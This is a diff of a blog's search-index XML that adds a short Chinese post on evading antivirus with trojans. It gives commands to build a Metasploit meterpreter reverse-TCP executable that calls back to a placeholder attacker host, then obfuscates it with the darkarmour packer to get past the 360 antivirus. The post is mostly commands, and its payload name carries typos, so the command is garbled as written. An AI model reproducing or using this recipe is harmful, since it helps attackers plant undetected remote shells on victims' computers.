@@ -33,33 +33,6 @@
     
     
     <entry>
-      <title>蓝桥杯选题（二）</title>
-      <link href="/2022/04/05/lan-qiao-bei-xuan-ti-er/"/>
-      <url>/2022/04/05/lan-qiao-bei-xuan-ti-er/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
-      <categories>
-          
-          <category> 算法 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 算法 </tag>
-            
-            <tag> 蓝桥杯 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>流量加密（一）</title>
       <link href="/2022/04/05/liu-liang-jia-mi-yi/"/>
       <url>/2022/04/05/liu-liang-jia-mi-yi/</url>
@@ -120,7 +93,7 @@
       <link href="/2022/04/05/mu-ma-mian-sha-er/"/>
       <url>/2022/04/05/mu-ma-mian-sha-er/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<h2 id="MSF加壳免杀过360"><a href="#MSF加壳免杀过360" class="headerlink" title="MSF加壳免杀过360"></a>MSF加壳免杀过360</h2><p>项目地址：<a href="https://github.com/bats3c/darkarmour">https://github.com/bats3c/darkarmour</a></p><p>安装依赖：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> MSF生成</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p winodws/x64/meterpreter/revserse_tcp LHOST=XXX.XXX.XX.XX LPORT=4444 -f exe -o exploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行</p><pre class="line-numbers language-none"><code class="language-none">./darkarmour.py -f exploit.exe --encrypt xor --jmp -o e.exe --loop 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CS免杀过360"><a href="#CS免杀过360" class="headerlink" title="CS免杀过360"></a>CS免杀过360</h2>]]></content>
       
       
       <categories>
@@ -134,9 +107,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> web安全 </tag>
-            
             <tag> 木马免杀 </tag>
+            
+            <tag> web安全 </tag>
             
         </tags>
       
@@ -163,9 +136,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 木马免杀 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 木马免杀 </tag>
             
         </tags>
       
